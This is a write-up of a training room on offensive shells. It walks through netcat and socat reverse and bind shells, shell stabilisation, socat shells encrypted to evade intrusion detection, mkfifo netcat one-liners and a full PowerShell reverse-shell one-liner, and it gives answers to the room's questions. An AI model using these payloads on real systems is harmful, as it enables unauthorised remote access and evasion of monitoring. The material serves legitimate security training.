# What is Shell?
An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.

## Task 1 What is a shell?

Before diving into the complexities of sending and receiving shells, it's essential to first understand what a shell is. At its core, a shell is an interface that allows users to interact with the Command Line Interface (CLI) of an operating system. Common examples include bash and sh on Linux, and cmd.exe or PowerShell on Windows.

In the context of remote exploitation, it is sometimes possible to manipulate a vulnerable application—such as a web server—into executing arbitrary code. When successful, attackers often seek to escalate this initial foothold into shell access on the target system.

This shell access can be achieved in one of two primary ways:

- **Reverse Shell:** The target machine initiates a connection back to the attacker's system, providing command-line access.
- **Bind Shell:** The target machine opens a listening port, allowing the attacker to connect to it directly for command execution.

This room will explore both methods in detail, offering practical examples and scenarios to reinforce understanding.

### Room Structure
The structure of this learning module is as follows:

- Informational sections with code samples and supporting screenshots.
- Two virtual machines (VMs)—one Linux-based and one Windows-based—available in the final two tasks for hands-on practice.
- Practice questions provided in Task 13, which can be completed independently or alongside the main tasks.

Let’s get started.

## Task 2 Tools

A variety of tools are available for receiving reverse shells and sending bind shells. Broadly, this process requires malicious shell code and a reliable method to interact with the resulting shell. Each tool plays a specific role in this workflow.

### Netcat
Netcat is often referred to as the "Swiss Army Knife" of networking. It allows users to perform various network-related tasks, including banner grabbing during enumeration. More importantly, it can be used to receive reverse shells and connect to ports exposed by bind shells on target systems. While Netcat shells are typically unstable by default, their reliability can be improved through additional techniques covered in later sections.

### Socat
Socat offers enhanced functionality compared to Netcat. It supports all of Netcat’s features and much more, often providing more stable shell connections right out of the box. However, Socat presents two main challenges: its syntax is more complex, and it is not installed by default on most Linux distributions, unlike Netcat. Both of these limitations can be addressed through specific workarounds discussed later. Versions of both Netcat and Socat are also available for Windows systems in executable format.

### Metasploit Multi/Handler
Metasploit’s multi/handler module is another key tool used to handle reverse shells. As part of the Metasploit Framework, it offers a more stable and feature-rich environment for managing shell sessions. It is particularly useful for interacting with Meterpreter shells and handling staged payloads—both of which are explored in a dedicated task.

### Msfvenom
Msfvenom, also part of the Metasploit Framework, is distributed as a standalone tool. It is designed to generate payloads dynamically. While msfvenom can produce various types of payloads, the focus here will be on reverse and bind shells. Given its versatility and power, msfvenom will be examined in more detail in a separate task.

### Additional Resources
In addition to these tools, several repositories provide a wide range of shell payloads written in different programming languages.[“Payloads All The Things”](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one of the most comprehensive collections. The PentestMonkey [Reverse Shell](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) Cheatsheet is another widely used reference. Kali Linux also includes a set of pre-installed webshells located at /usr/share/webshells. Furthermore, the [SecLists](https://github.com/danielmiessler/SecLists) repository, although mainly used for wordlists, contains useful scripts and code snippets for gaining shell access.

## Task 3 Types of Shell
At a high level, there are two primary types of shells used when exploiting a target: reverse shells and bind shells.

### Reverse Shells
A reverse shell occurs when the target system is forced to initiate a connection back to the attacker's machine. In this scenario, the attacker sets up a listener using one of the tools discussed previously, such as Netcat, to receive the incoming connection. This method is particularly effective for bypassing firewall restrictions that prevent external connections to certain ports on the target system.

One consideration with reverse shells is that the attacker's network must be configured to accept incoming connections, which can involve setting up port forwarding or using tunneling services. However, within controlled environments like the TryHackMe network, this configuration is handled automatically, simplifying the process significantly.

### Bind Shells
In contrast, a bind shell is established by executing code on the target system that opens a listener directly on the target. The attacker then connects to this exposed port to gain remote access. The advantage of this method is that it does not require any changes to the attacker's network setup. However, it may be blocked by firewalls on the target machine that prevent incoming connections.

As a general rule, reverse shells tend to be easier to execute and troubleshoot, making them the preferred option in most cases, especially in Capture The Flag (CTF) challenges.

**Example: Reverse Shell**

To better understand how a reverse shell works, consider the following example. The attacking machine sets up a listener using Netcat:

**On the attacking machine:**
```bash
sudo nc -lvnp 443
```
Meanwhile, the target system sends a shell back by executing the following command:

**On the target:**
```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```
In practice, the reverse shell command on the target is often executed via a vulnerability such as code injection in a web application. In this setup, think of the attacker’s terminal as the listener (receiving the connection), and the target’s terminal as the system initiating the reverse shell.

![image](https://github.com/user-attachments/assets/a9b2c516-fd43-44f9-b0fb-8aa57a3e1239)

Once the reverse shell command is executed on the target, the listener on the attacker’s machine receives an incoming connection. At this point, the attacker can begin interacting with the target system. For instance, running the whoami command reveals that commands are being executed in the context of the target user. The key detail here is that the attacker is passively listening on their own machine, while the connection is actively initiated by the target.

**Example: Bind Shell**

While bind shells are less common than reverse shells, they are still highly useful in certain scenarios.

In this example, a Windows system is used as the target. The target first initiates a listener that is configured to launch cmd.exe. Once the listener is active, the attacker connects directly to the open port from their machine, gaining command-line access.

**On the target:**
```bash
nc -lvnp <port> -e "cmd.exe"
```
**On the attacking machine:**
```bash
nc MACHINE_IP <port>
```
![image](https://github.com/user-attachments/assets/63896153-7ac5-4d1a-ba95-6526e52bbd32)

As demonstrated, this method once again provides code execution on the remote system. It’s important to note that this process is not limited to Windows—bind shells work similarly across different operating systems.

The critical distinction here is that the listener is set up on the target, and the attacker’s machine is used to connect to it. This is the opposite of how reverse shells operate.

**Shell Interactivity**

The final concept relevant to this task is interactivity. Shells can be categorized as either interactive or non-interactive.

- Interactive Shells: These are the types of shells users are typically familiar with, such as PowerShell, Bash, Zsh, or sh. An interactive shell allows you to not only execute commands but also interact with programs as they run. For example, logging into a server using SSH presents a prompt where users can issue commands and receive immediate feedback—this is a classic example of an interactive shell.

![image](https://github.com/user-attachments/assets/6894388a-df71-486b-9cf4-d8b11cedaf34)

Here you can see that it's asking interactively that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.

- Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:

![image](https://github.com/user-attachments/assets/ea6d2eef-1543-44ba-9dbe-9febdacf9533)

Notice that the whoami command (which is non-interactive) executes perfectly, but the ssh command (which is interactive) gives us no output at all. As an interesting side note, the output of an interactive command does go somewhere, however, figuring out where is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.

Additionally, in various places throughout this task you will see a command in the screenshots called listener. This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing sudo rlwrap nc -lvnp 443, which will be covered in upcoming tasks. It will not work on any other machine unless the alias has been configured locally.

### Question 1:
Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?

**Answer:** R

### Question 2:
You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)

**Answer:** N

### Question 3:
When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?

**Answer:** T

## Task 4 Netcat
Netcat remains one of the most fundamental tools in a pentester’s toolkit for network interactions, including shell management. While it supports a broad range of functions, this section will focus specifically on its use for reverse and bind shells.

### Reverse Shells with Netcat
Reverse shells require two components: shellcode executed on the target and a listener running on the attacker’s machine. Setting up a listener is the first step, and Netcat provides a simple yet powerful way to do this on Linux.

The syntax to start a Netcat listener is:
```bash
nc -lvnp <port-number>
```
- -l tells Netcat to operate in listener mode.
- -v enables verbose output to provide detailed connection information.
- -n disables DNS resolution, which is beyond the scope of this discussion.
- -p indicates that the following argument specifies the port number.

Note that ports below 1024 require elevated privileges (sudo) to bind to them. Using well-known ports like 80, 443, or 53 often helps bypass outbound firewall restrictions on the target system.

Once the listener is active, a reverse shell payload from the target can connect back, providing command-line access. The previous task included examples demonstrating this process.

### Bind Shells with Netcat
When obtaining a bind shell, the assumption is that the target already has a listener running on a chosen port. The attacker simply needs to connect to this open port.

The syntax to connect to a bind shell listener is straightforward:
```bash
nc <target-ip> <chosen-port>
```
This command initiates an outbound connection to the target's listening port, granting shell access if successful.

Further details on using Netcat to create listeners for bind shells will be covered in Task 8. The key takeaway here is understanding how to connect to an existing listening port with Netcat.

### Question 1:
Which option tells netcat to listen?

**Answer:** -l

### Question 2:
How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?

**Answer:** nc 10.10.10.11 8080

## Task 5 Netcat Shell Stabilisation

Ok, so we've caught or connected to a netcat shell, what next?

These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it.

### Technique 1: Python

The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

- The first thing to do is use python -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
- Step two is: export TERM=xterm -- this will give us access to term commands such as clear.
- Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

The full technique can be seen here:

![image](https://github.com/user-attachments/assets/7114bf84-49df-495d-9846-d779f62d4a86)

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

### Technique 2: rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.

To use rlwrap, we invoke a slightly different listener:
```bash
rlwrap nc -lvnp <port>
```

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.

### Technique 3: Socat

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:

![image](https://github.com/user-attachments/assets/5513c71d-98a4-4ba4-8a28-19e7b925eb31)

Next, in your reverse/bind shell, type in:
```bash
stty rows <number>
```
and
```bash
stty cols <number>
```
Filling in the numbers you got from running the command in your own terminal.

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

### Question 1:
How would you change your terminal size to have 238 columns?

**Answer:** stty cols 238

### Question 2:
What is the syntax for setting up a Python3 webserver on port 80?

**Answer:** sudo python3 -m http.server 80


## Task 6 Socat
Socat is a powerful and versatile tool that shares some similarities with Netcat but offers significantly more flexibility. Think of Socat as a network connector between two endpoints — whether that's between a keyboard and a port, two ports, or even a port and a file. It’s like a portal linking two systems together, allowing data to pass seamlessly.

### Reverse Shells with Socat
Setting up reverse shells using Socat is slightly more complex than with Netcat, but it offers more stability and options.

**Basic Reverse Shell Listener**

On the attacker machine, use the following command to start a listener:
```bash
socat TCP-L:<PORT> -
```

This command links a TCP listener to standard input/output, similar to:
```bash
nc -lvnp <port>
```

Connecting from Target
- On Windows:
  ```bash
  socat TCP:<ATTACKER-IP>:<PORT> EXEC:powershell.exe,pipes
  ```
  The pipes option is crucial here for compatibility between Unix-style I/O and Windows command-line interfaces.
- On Linux:
  ```bash
  socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li"
  ```

### Bind Shells with Socat
Bind shells allow the target machine to host the listener. Here’s how you set them up:

**Target (Listener):**
- On Linux:
  ```bash
  socat TCP-L:<PORT> EXEC:"bash -li"
  ```
- On Windows:
  ```bash
  socat TCP-L:<PORT> EXEC:powershell.exe,pipes
  ```

**Attacker (Connect to Shell):**

On the attacker’s machine, connect to the listener with:
```bash
socat TCP:<TARGET-IP>:<PORT> -
```

### Stable Linux TTY Reverse Shell (Socat’s Power Feature)
One of Socat’s most powerful uses is creating a fully stable TTY reverse shell — ideal for Linux targets.

**Listener (Attacker Machine):**
```bash
socat TCP-L:<PORT> FILE:`tty`,raw,echo=0
```
**Breakdown:**
- FILE:\tty`` connects standard I/O to the terminal device.
- raw,echo=0 disables echo and puts terminal in raw mode, improving shell stability.


**Target (Trigger Reverse Shell with Socat):**
```bash
socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

**Explanation of options:**

- EXEC:"bash -li": Starts a login Bash shell.
- pty: Allocates a pseudo-terminal.
- stderr: Displays error output.
- sigint: Enables signal interruptions like Ctrl+C.
- setsid: Starts a new session.
- sane: Normalizes terminal settings for better behavior.

### Enhancements and Troubleshooting
- For text editor support (e.g., Vim, Nano), consider running:
  ```bash
  stty raw -echo; fg
  ```
  after receiving the shell.

- For debugging, increase verbosity:
  ```bash
  socat -d -d [rest-of-command]
  ```
This will help you understand where issues may be occurring, especially when working in unfamiliar environments or experimenting with configurations.

### Question 1:
How would we get socat to listen on TCP port 8080?

**Answer:** TCP-L:8080

## Task 7 Socat Encrypted Shells
One of the most powerful features of Socat is its ability to create encrypted bind and reverse shells using OpenSSL. This provides:

- Confidentiality: Encrypted traffic prevents eavesdropping.
- Stealth: Encrypted traffic is harder for Intrusion Detection Systems (IDS) to analyze.
- Improved Security: Prevents shell session hijacking.

### Why Use Encrypted Shells?
Plaintext shells (e.g., Netcat) can be easily sniffed on the network. Encrypted shells ensure that:

- Your commands and responses are secure.
- The session is less detectable to security monitoring tools.

### Step 1: Generate a Self-Signed SSL Certificate
Run the following on your attacker machine to generate a certificate and private key:
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
- rsa:2048: Generates a 2048-bit RSA key.
- -nodes: No passphrase.
- -x509: Self-signed cert.
- -days 362: Validity of 362 days.

Then merge the key and certificate into a single .pem file:
```bash
cat shell.key shell.crt > shell.pem
```

### Step 2: Encrypted Reverse Shell
**Attacker (Listener):**
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
- OPENSSL-LISTEN: Enables SSL over TCP.
- cert=shell.pem: Your self-signed cert.
- verify=0: Skips certificate authority verification.

### Target (Connect Back):
- On Linux:
  ```bash
  socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:/bin/bash
  ```
- On Windows:
  ```bash
  socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:powershell.exe,pipes
  ```

### Step 3: Encrypted Bind Shell
**Target (Listener):**
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
⚠️ You'll need to copy the .pem file to the target, since it's the one hosting the listener.

**Attacker (Connect to Target):**
```bash
socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -
```

### Encrypted Fully-Interactive TTY Shell (Linux Only)
You can combine the stable TTY shell with encryption.

**Attacker (Listener):**
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```

**Target (Encrypted Interactive Shell Connection):**
```bash
socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
This gives you a fully interactive, encrypted bash shell — stable and secure.

### Final Tips
- Always remember: the certificate goes with the listener.
- Use -d -d flags for verbosity if troubleshooting:
  ```bash
  socat -d -d [rest-of-command]
  ```
- Most targets don’t have Socat by default. If needed, upload a precompiled static binary of Socat.

The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:

![image](https://github.com/user-attachments/assets/5fde3a5f-0a39-42fb-83e5-e66612c3604a)

This technique is invaluable for stealthy and secure remote access during red team operations or penetration tests.

### Question 1:
What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

**Answer:** socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

### Question 2:
If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

**Answer:** socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

## Task 8 Common Shell Payloads
Before diving into creating payloads with msfvenom, I took some time to explore a few commonly used payloads using the tools we've already covered — mainly netcat.

In one of the earlier tasks, there was mention of setting up netcat to act as a listener for a bind shell, so I decided to try that out first. Some versions of netcat, like the nc.exe for Windows (which is available in Kali under /usr/share/windows-resources/binaries) and the netcat-traditional version used in Kali Linux, support the -e flag. This flag allows you to execute a command once a connection is made. For example:
```bash
nc -lvnp <PORT> -e /bin/bash
```

Connecting to this listener from another machine using netcat would give a bind shell on the target.

Similarly, you can get a reverse shell by using:
```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

However, it's worth noting that most netcat versions don’t include the -e option, as it’s considered a serious security risk. On Windows, where we often use a static binary anyway, this method works just fine. On Linux, though, an alternative approach is necessary. Here’s a useful one-liner I found that creates a bind shell using standard netcat:
```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

To quickly break it down: this command sets up a named pipe at /tmp/f, and then ties the netcat listener's input/output to a shell via that pipe. The idea is to route everything typed into the netcat session through the pipe, into sh, and then back again, creating a functional shell.

![image](https://github.com/user-attachments/assets/323cff8b-03ea-4036-8916-8c2eb1b22e1d)

I also found that a very similar one-liner can be used to create a netcat reverse shell:
```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

This is nearly identical to the bind shell version I mentioned earlier — the only real difference is that this time, netcat is initiating a connection to the attacker's machine (reverse shell), rather than listening for one. It's a neat little trick for getting around the lack of the -e flag in most netcat builds.

![image](https://github.com/user-attachments/assets/1baa33bb-af0d-4691-bec5-ed788c4073b5)

When working with modern Windows Server targets, I often find that a PowerShell reverse shell is required. It's a pretty common approach, so I made sure to keep the go-to one-liner handy.

The command itself looks messy and complex — and to keep things simple, I won’t go into breaking it down here, but it’s incredibly effective:

```bash
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

All I had to do was swap in my attacker IP and chosen port in place of <ip> and <port>. After that, I could simply drop it into a cmd.exe shell (or even a webshell) and execute it — and just like that, I’d have a reverse shell back to my machine.

![image](https://github.com/user-attachments/assets/50bda3a6-8773-4219-b21c-cc262c5e715b)

For other common reverse shell payloads, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what's available.

### Question 1:
What command can be used to create a named pipe in Linux?

**Answer:** mkfifo 

### Question 2: Look through the linked Payloads all the Things Reverse Shell Cheatsheet and familiarise yourself with the languages available.

**Answer:** No answer needed
